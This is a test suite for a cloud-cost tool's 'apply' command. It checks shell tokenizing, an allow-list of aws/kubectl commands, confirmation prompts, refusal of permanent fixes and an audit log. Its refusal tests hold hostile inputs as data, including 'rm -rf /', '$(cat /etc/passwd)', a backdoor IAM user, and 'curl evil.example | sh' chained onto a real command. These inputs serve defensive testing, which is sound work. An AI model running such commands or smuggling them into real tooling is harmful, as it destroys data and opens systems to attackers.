/**
 * apply: the only command that can change anything. These tests are about
 * what it refuses as much as what it runs. The aws and kubectl programs are
 * stand-ins that write down how they were called, so nothing real is touched.
 */
import assert from "node:assert/strict";
import { appendFileSync, chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { test } from "node:test";
import { fileURLToPath } from "node:url";
import { apply, ApplyError, plan, renderAudit, runnable, tokenize, type AuditEntry, type Runner } from "../src/apply.js";
import { collectCluster, type KubeReader } from "../src/kube.js";
import { detectCluster, OPENCOST_DEFAULTS } from "../src/kube-detect.js";
import type { Finding, ScanResult } from "../src/types.js";
import { cli, FIXTURE } from "./helpers.js";

const here = dirname(fileURLToPath(import.meta.url));
const NOW = new Date("2026-10-03T12:00:00Z");

/** The recorded AWS lab scan, as taken an hour ago. */
const account: ScanResult = { ...JSON.parse(cli(["scan", "--replay", FIXTURE, "--json"], { blockNetwork: true }).stdout), scannedAt: "2026-10-03T11:00:00Z" };

/** The recorded Kubernetes lab scan, as taken an hour ago. */
const kubeFixture = JSON.parse(readFileSync(resolve(here, "fixtures/kube-lab.json"), "utf8"));
const kubeReader: KubeReader = { identity: async () => kubeFixture.identity, get: async (path) => kubeFixture.responses[path] };
const cluster: ScanResult = {
  ...detectCluster(await collectCluster(kubeReader, { lookbackHours: kubeFixture.lookbackHours, now: new Date(kubeFixture.recordedAt) }), OPENCOST_DEFAULTS),
  scannedAt: "2026-10-03T11:00:00Z",
};

const byPattern = (scan: ScanResult, pattern: string) => scan.findings.find((f) => f.pattern === pattern)!;
/** An unattached gp2 volume: deleting it is permanent, converting it to gp3 can be undone. */
const volume = account.findings.find((f) => f.alternative)!;
const VOLUME = volume.resourceIds[0]!;
const address = byPattern(account, "idle-elastic-ip");
const options = { maxAgeHours: 24, now: NOW };

test("a printed command is split into arguments, and anything a shell would act on is refused", () => {
  assert.deepEqual(tokenize("aws ec2 modify-volume --volume-id vol-1 --volume-type gp3 --region ap-south-1"), ["aws", "ec2", "modify-volume", "--volume-id", "vol-1", "--volume-type", "gp3", "--region", "ap-south-1"]);
  assert.deepEqual(tokenize(`aws s3api x --lifecycle-configuration '{"Rules":[{"ID":"a b"}]}'`), ["aws", "s3api", "x", "--lifecycle-configuration", '{"Rules":[{"ID":"a b"}]}']);
  assert.deepEqual(tokenize(`aws ec2 modify-instance-attribute --instance-type "{\\"Value\\": \\"m5.large\\"}"`), ["aws", "ec2", "modify-instance-attribute", "--instance-type", '{"Value": "m5.large"}']);
  assert.deepEqual(tokenize(`aws s3api abort-multipart-upload --key 'my file (1).bin' --upload-id ''`), ["aws", "s3api", "abort-multipart-upload", "--key", "my file (1).bin", "--upload-id", ""]);
  for (const bad of [
    "aws ec2 delete-volume --volume-id vol-1; rm -rf /",
    "aws ec2 delete-volume --volume-id vol-1 && aws iam delete-user --user-name x",
    "aws ec2 delete-volume --volume-id $(cat /etc/passwd)",
    'aws ec2 delete-volume --volume-id "$HOME"',
    "aws ec2 delete-volume --volume-id `id`",
    "aws ec2 delete-volume --volume-id vol-1 > /tmp/out",
    "aws ec2 delete-volume --volume-id vol-1 | sh",
    "aws ec2 delete-volume --volume-id 'vol-1",
    "aws ec2 delete-volume --volume-id vol-1\nrm -rf /",
    "aws ec2 delete-volume --volume-id vol-*",
    "aws ec2 delete-volume --volume-id vol-[12]",
  ]) {
    assert.throws(() => tokenize(bad), ApplyError, bad);
  }
});

test("every fix the rules print for the two labs is a command apply can run, and nothing else is", () => {
  const printed = [...account.findings, ...cluster.findings].flatMap((f: Finding) => [...f.fix.commands, ...(f.alternative?.commands ?? [])]);
  assert.ok(printed.length >= 15);
  for (const command of printed) assert.ok(["aws", "kubectl"].includes(runnable(command)[0]!), command);

  for (const foreign of [
    "aws iam create-user --user-name backdoor",
    "aws ec2 run-instances --image-id ami-1",
    "aws ec2 delete-volumes --volume-id vol-1",
    "kubectl delete namespace shop",
    "kubectl delete pods --all",
    "kubectl apply -f evil.yaml",
    "kubectl exec -it pod -- sh",
    "rm -rf /",
    "curl https://example.com/x.sh",
    "sudo aws ec2 delete-volume --volume-id vol-1",
  ]) {
    assert.throws(() => runnable(foreign), /only runs the kinds of command its own rules print/, foreign);
  }
});

test("the fix that can be undone is chosen unless the permanent one is asked for", () => {
  const [gentle] = plan([account], [VOLUME], options);
  assert.equal(gentle!.which, "alternative");
  assert.equal(gentle!.fix.risk, "caution");
  assert.match(gentle!.commands[0]!.text, /^aws ec2 modify-volume --volume-id \S+ --volume-type gp3 /);
  assert.equal(gentle!.monthlySavingUsd, volume.alternative!.monthlySavingUsd);

  const [permanent] = plan([account], [VOLUME], { ...options, allowPermanent: true });
  assert.equal(permanent!.which, "fix");
  assert.match(permanent!.commands[0]!.text, /^aws ec2 delete-volume /);

  // A finding whose only fix is permanent is refused until it is asked for by name.
  assert.throws(() => plan([account], address.resourceIds, options), /The only fix for \S+ is permanent .* --allow-permanent/);
});

test("naming a resource has to be exact, unambiguous and recent", () => {
  assert.throws(() => plan([account], ["vol-0ffffffffffffffff"], options), /No finding for vol-0ffffffffffffffff in the saved scans/);
  assert.throws(() => plan([account], [], options), /Name the resource/);

  // The cluster's findings are found in its own saved scan, with no flag saying which scan to look in.
  const [resize] = plan([account, cluster], ["deployment/reports"], options);
  assert.equal(resize!.scan.cluster!.context, "kind-cloudpilot-lab");
  assert.deepEqual(resize!.commands[0]!.args.slice(0, 4), ["kubectl", "set", "resources", "deployment/reports"]);

  // The same name in two namespaces: say which.
  const twin: Finding = { ...byPattern(cluster, "over-requested-workload"), region: "staging" };
  const both = { ...cluster, findings: [...cluster.findings, twin] };
  const named = twin.resourceIds[0]!;
  assert.throws(() => plan([both], [named], options), new RegExp(`${named} matches more than one finding\\. Name one of:\\n  shop/${named}.*\\n  staging/${named}`));
  assert.equal(plan([both], [`staging/${named}`], options)[0]!.finding.region, "staging");

  assert.throws(() => plan([{ ...account, scannedAt: "2026-10-02T11:00:00Z" }], [VOLUME], options), /is from 2026-10-02T11:00:00Z, more than 24 hours ago\. Things may have changed since: scan again, then apply\./);

  // A scan dated in the future says a clock is wrong, so its age proves nothing.
  assert.throws(() => plan([{ ...account, scannedAt: "2026-10-05T11:00:00Z" }], [VOLUME], options), /is from 2026-10-05T11:00:00Z, more than 24 hours in the future, so a clock is wrong\./);
  // A time that cannot be read is refused as such, without claiming an age nobody worked out.
  assert.throws(() => plan([{ ...account, scannedAt: "not a date" }], [VOLUME], options), /says it was taken at "not a date", which cannot be read as a time, so how old it is cannot be told\./);
  // Small skew either way is still fresh.
  assert.equal(plan([{ ...account, scannedAt: "2026-10-03T12:05:00Z" }], [VOLUME], options).length, 1);
});

/** A runner that only writes down what it was asked to run. */
function recorder(failOn?: string) {
  const ran: string[][] = [];
  const runner: Runner = {
    run: async (program, args) => {
      ran.push([program, ...args]);
      return args.includes(failOn ?? "\u0000") ? { exitCode: 254, output: "An error occurred (UnauthorizedOperation)" } : { exitCode: 0, output: "" };
    },
  };
  return { ran, runner };
}

function context(overrides: Partial<Parameters<typeof apply>[1]> & { runner: Runner }) {
  const said: string[] = [];
  const log: AuditEntry[] = [];
  return {
    said,
    log,
    ctx: { say: (line: string) => said.push(line), record: async (entry: AuditEntry) => void log.push(entry), user: "sai", now: () => NOW, ...overrides },
  };
}

test("a fix that can be undone runs when the reader says yes, in order, and is recorded with its way back", async () => {
  const { ran, runner } = recorder();
  const answers = ["y"];
  const { ctx, log, said } = context({ runner, ask: async () => answers.shift()! });
  const plans = plan([cluster], ["deployment/reports"], options);
  assert.deepEqual(await apply(plans, ctx), ["applied"]);
  assert.deepEqual(ran, [["kubectl", "set", "resources", "deployment/reports", "-n", "shop", "--context", "kind-cloudpilot-lab", "-c", "worker", "--requests=cpu=10m,memory=32Mi"]]);
  assert.equal(log.length, 1);
  assert.deepEqual([log[0]!.outcome, log[0]!.user, log[0]!.scope, log[0]!.target, log[0]!.risk, log[0]!.commands[0]!.exitCode], ["applied", "sai", "cluster", "kind-cloudpilot-lab", "caution", 0]);
  assert.match(log[0]!.wayBack, /To go back: kubectl set resources deployment\/reports .* --requests=cpu=300m,memory=512Mi/);
  assert.ok(said.some((line) => line.includes("Can be undone.")));

  // "no", or just Enter, leaves it alone.
  for (const answer of ["n", ""]) {
    const again = recorder();
    const declined = context({ runner: again.runner, ask: async () => answer });
    assert.deepEqual(await apply(plans, declined.ctx), ["declined"]);
    assert.deepEqual(again.ran, []);
    assert.equal(declined.log[0]!.outcome, "declined");
  }
});

test("with nobody to ask, only --yes runs a fix that can be undone, and nothing runs a permanent one", async () => {
  const gentle = plan([account], [VOLUME], options);
  const unattended = recorder();
  const refused = context({ runner: unattended.runner });
  assert.deepEqual(await apply(gentle, refused.ctx), ["refused"]);
  assert.deepEqual(unattended.ran, []);
  assert.match(refused.log[0]!.reason!, /no terminal to ask at\. Pass --yes/);

  const approved = recorder();
  assert.deepEqual(await apply(gentle, context({ runner: approved.runner, yes: true }).ctx), ["applied"]);
  assert.equal(approved.ran.length, 1);

  // --yes is not consent to something that cannot be undone.
  const permanent = plan([account], [VOLUME], { ...options, allowPermanent: true });
  const never = recorder();
  const blocked = context({ runner: never.runner, yes: true });
  assert.deepEqual(await apply(permanent, blocked.ctx), ["refused"]);
  assert.deepEqual(never.ran, []);
  assert.match(blocked.log[0]!.reason!, /a permanent fix is never run unattended/);
});

test("a permanent fix runs only after the resource ID is typed back, whatever --yes says", async () => {
  const permanent = plan([account], [VOLUME], { ...options, allowPermanent: true });
  for (const typed of ["y", "yes", "", "vol-0123", `${VOLUME} `.toUpperCase()]) {
    const { ran, runner } = recorder();
    const { ctx, log } = context({ runner, yes: true, ask: async () => typed });
    assert.deepEqual(await apply(permanent, ctx), ["declined"], JSON.stringify(typed));
    assert.deepEqual(ran, []);
    assert.equal(log[0]!.reason, "Left alone: the resource ID was not typed back.");
  }
  const { ran, runner } = recorder();
  const { ctx, log, said } = context({ runner, ask: async (question) => (assert.match(question, new RegExp(`Type ${VOLUME} to run this permanent fix`)), VOLUME) });
  assert.deepEqual(await apply(permanent, ctx), ["applied"]);
  assert.deepEqual(ran[0]!.slice(0, 5), ["aws", "ec2", "delete-volume", "--volume-id", VOLUME]);
  assert.equal(log[0]!.risk, "dangerous");
  assert.ok(said.some((line) => line.includes("PERMANENT: this cannot be undone.")));
});

test("a command that fails stops everything after it, and the record shows what did and did not run", async () => {
  // An unused AMI: deregister the image, then delete its snapshot. Two commands, both permanent.
  const image = byPattern(account, "unused-ami");
  const plans = plan([account, cluster], [image.resourceIds[0]!, "deployment/reports"], { ...options, allowPermanent: true });
  assert.equal(plans[0]!.commands.length, 2);
  const { ran, runner } = recorder("deregister-image");
  const { ctx, log, said } = context({ runner, ask: async () => image.resourceIds[0]! });
  assert.deepEqual(await apply(plans, ctx), ["failed", "refused"]);
  assert.equal(ran.length, 1, "the snapshot is not deleted once deregistering failed, and the next fix is not started");
  assert.deepEqual(log[0]!.commands.map((c) => c.exitCode), [254, undefined]);
  assert.match(log[0]!.commands[0]!.output!, /UnauthorizedOperation/);
  assert.match(log[1]!.reason!, /an earlier fix failed, so everything after it was left alone/);
  assert.ok(said.some((line) => line.includes("Failed with exit code 254. Nothing after this was run.")));

  const text = renderAudit(log);
  assert.match(text, /2026-10-03T12:00:00\.000Z {2}FAILED {4}ami-\S+.*by sai\n {4}.*\[permanent\]\n {4}exit 254 {2}aws ec2 deregister-image .*\n {4}not run {2}aws ec2 delete-snapshot /);
  assert.equal(renderAudit([]), "No fix has been run, declined or refused from this directory yet.");
});

test("a dry run shows the commands and runs and records nothing", async () => {
  const { ran, runner } = recorder();
  const { ctx, log, said } = context({ runner, dryRun: true, yes: true });
  assert.deepEqual(await apply(plan([account], [VOLUME], options), ctx), ["dry-run"]);
  assert.deepEqual([ran, log], [[], []]);
  assert.ok(said.some((line) => /^ {2}\$ aws ec2 modify-volume /.test(line)));
  assert.ok(said.includes("  Dry run: nothing was run."));
});

// The command itself, with aws and kubectl replaced by programs that only write down how they were called.

const STAND_IN = `#!/usr/bin/env node
const fs = require("fs");
const path = require("path");
const args = process.argv.slice(2);
fs.appendFileSync(process.env.STAND_IN_LOG, JSON.stringify({ program: path.basename(process.argv[1]), args, profile: process.env.AWS_PROFILE || null }) + "\\n");
if (process.env.STAND_IN_FAIL && args.includes(process.env.STAND_IN_FAIL)) { process.stderr.write("An error occurred (UnauthorizedOperation)"); process.exitCode = 254; }
`;

function workspace(scans: Record<string, ScanResult>) {
  const dir = mkdtempSync(join(tmpdir(), "cloudpilot-apply-"));
  const bin = join(dir, "bin");
  mkdirSync(bin);
  for (const name of ["aws", "kubectl"]) {
    writeFileSync(join(bin, name), STAND_IN);
    chmodSync(join(bin, name), 0o755);
  }
  const cwd = join(dir, "work");
  mkdirSync(join(cwd, ".cloudpilot"), { recursive: true });
  for (const [name, scan] of Object.entries(scans)) writeFileSync(join(cwd, ".cloudpilot", name), JSON.stringify(scan));
  const log = join(dir, "calls.log");
  return {
    cwd,
    calls: (): Array<{ program: string; args: string[]; profile: string | null }> => (existsSync(log) ? readFileSync(log, "utf8").trim().split("\n").map((line) => JSON.parse(line)) : []),
    run: (args: string[], env: Record<string, string> = {}) => cli(args, { blockNetwork: true, cwd, env: { PATH: `${bin}:${dirname(process.execPath)}`, STAND_IN_LOG: log, ...env } }),
  };
}

const fresh = (scan: ScanResult): ScanResult => ({ ...scan, scannedAt: new Date().toISOString() });
const saved = () => workspace({ "last-scan.json": fresh(account), "last-kube-scan-kind-cloudpilot-lab.json": fresh(cluster) });

test("cloudpilot apply runs the named fix through the real program's arguments and keeps a record", () => {
  const ws = saved();
  const run = ws.run(["apply", VOLUME, "deployment/reports", "--yes", "--profile", "ops"]);
  assert.equal(run.status, 0, run.stderr);
  assert.deepEqual(ws.calls(), [
    { program: "aws", args: ["ec2", "modify-volume", "--volume-id", VOLUME, "--volume-type", "gp3", "--region", "ap-south-1"], profile: "ops" },
    { program: "kubectl", args: ["set", "resources", "deployment/reports", "-n", "shop", "--context", "kind-cloudpilot-lab", "-c", "worker", "--requests=cpu=10m,memory=32Mi"], profile: "ops" },
  ]);
  assert.match(run.stdout, /Can be undone\./);
  assert.match(run.stderr, /Recorded in \.cloudpilot\/audit\.jsonl\. See it with: cloudpilot audit/);

  const audit = ws.run(["audit"]);
  assert.equal(audit.status, 0, audit.stderr);
  assert.match(audit.stdout, new RegExp(`APPLIED {3}${VOLUME} {2}\\(account 123456789012, ap-south-1\\)`));
  assert.match(audit.stdout, /APPLIED {3}deployment\/reports {2}\(cluster kind-cloudpilot-lab, shop\)/);
  assert.equal(JSON.parse(ws.run(["audit", "--json"]).stdout).length, 2);
});

test("a line of the audit log that cannot be read costs that line, not the whole record", () => {
  const ws = saved();
  assert.equal(ws.run(["apply", VOLUME, "--yes"]).status, 0);
  // Half a line from a killed process, and a line that is JSON but not an entry.
  appendFileSync(join(ws.cwd, ".cloudpilot/audit.jsonl"), '{"at":"2026-10-03T12:00:0\n{"at":"2026-10-03T12:00:00Z","outcome":"applied"}\n');

  const audit = ws.run(["audit"]);
  assert.equal(audit.status, 0, audit.stderr);
  assert.match(audit.stdout, new RegExp(`APPLIED {3}${VOLUME}`));
  assert.match(audit.stderr, /2 lines of \.cloudpilot\/audit\.jsonl could not be read and are not shown above\./);
  assert.equal(JSON.parse(ws.run(["audit", "--json"]).stdout).length, 1);
});

test("an audit log that exists but cannot be read is said to be unreadable, not empty", () => {
  const ws = saved();
  mkdirSync(join(ws.cwd, ".cloudpilot/audit.jsonl"), { recursive: true });

  const audit = ws.run(["audit"]);
  assert.equal(audit.status, 1);
  assert.doesNotMatch(audit.stdout, /No fix has been run/);
  assert.match(audit.stderr, /\.cloudpilot\/audit\.jsonl is there but could not be read \(EISDIR\)\./);
});

test("run unattended, the command refuses a permanent fix and a fix nobody approved, and runs nothing", () => {
  const ws = saved();
  const permanent = ws.run(["apply", VOLUME, "--allow-permanent", "--yes"]);
  assert.equal(permanent.status, 1);
  assert.match(permanent.stdout, /PERMANENT: this cannot be undone\./);
  assert.match(permanent.stdout, /Not run: a permanent fix is never run unattended\. Run this at a terminal\./);

  const unapproved = ws.run(["apply", VOLUME]);
  assert.equal(unapproved.status, 1);
  assert.match(unapproved.stdout, /Not run: there is no terminal to ask at\. Pass --yes/);

  const onlyPermanent = ws.run(["apply", address.resourceIds[0]!, "--yes"]);
  assert.equal(onlyPermanent.status, 1);
  assert.match(onlyPermanent.stderr, /The only fix for \S+ is permanent/);

  assert.deepEqual(ws.calls(), [], "neither program was ever started");
  assert.deepEqual(JSON.parse(ws.run(["audit", "--json"]).stdout).map((e: AuditEntry) => e.outcome), ["refused", "refused"]);
});

test("a saved scan that has been tampered with cannot make apply run something else", () => {
  const forged = fresh(account);
  forged.findings = forged.findings.map((f) => (f.resourceIds[0] === VOLUME ? { ...f, alternative: { ...f.alternative!, commands: ["aws iam create-user --user-name backdoor"] } } : f));
  const ws = workspace({ "last-scan.json": forged });
  const run = ws.run(["apply", VOLUME, "--yes"]);
  assert.equal(run.status, 1);
  assert.match(run.stderr, /CloudPilot only runs the kinds of command its own rules print, and this is not one: aws iam create-user/);
  assert.deepEqual(ws.calls(), []);

  const chained = fresh(account);
  chained.findings = chained.findings.map((f) => (f.resourceIds[0] === VOLUME ? { ...f, alternative: { ...f.alternative!, commands: [`${f.alternative!.commands[0]}; curl evil.example | sh`] } } : f));
  const second = workspace({ "last-scan.json": chained });
  assert.match(second.run(["apply", VOLUME, "--yes"]).stderr, /Not a plain command/);
  assert.deepEqual(second.calls(), []);
});

test("an old scan, a missing scan and a dry run all leave everything alone", () => {
  const stale = workspace({ "last-scan.json": { ...account, scannedAt: "2026-01-01T00:00:00Z" } });
  assert.match(stale.run(["apply", VOLUME, "--yes"]).stderr, /more than 24 hours ago\. Things may have changed since: scan again, then apply\./);
  assert.deepEqual(stale.calls(), []);

  const empty = workspace({});
  assert.match(empty.run(["apply", VOLUME, "--yes"]).stderr, /There is no saved scan in this directory to take a fix from\. Run a scan here first\./);

  const ws = saved();
  const dry = ws.run(["apply", VOLUME, "--dry-run"]);
  assert.equal(dry.status, 0, dry.stderr);
  assert.match(dry.stdout, /\$ aws ec2 modify-volume .*\n {2}Dry run: nothing was run\./);
  assert.deepEqual(ws.calls(), []);
  assert.equal(existsSync(join(ws.cwd, ".cloudpilot/audit.jsonl")), false);
});

test("a failing command makes apply fail, stop, and say so in the record", () => {
  const ws = saved();
  const run = ws.run(["apply", VOLUME, "deployment/reports", "--yes"], { STAND_IN_FAIL: "modify-volume" });
  assert.equal(run.status, 1);
  assert.equal(ws.calls().length, 1, "the cluster fix after the failed one is not started");
  assert.deepEqual(JSON.parse(ws.run(["audit", "--json"]).stdout).map((e: AuditEntry) => e.outcome), ["failed", "refused"]);
});

test("scanning never starts aws or kubectl to change anything: only apply does", () => {
  const ws = saved();
  for (const args of [["scan", "--replay", FIXTURE], ["scan", "--replay", FIXTURE, "--html", "report.html"], ["audit"]]) {
    assert.equal(ws.run(args).status, 0);
  }
  assert.deepEqual(ws.calls(), []);
});
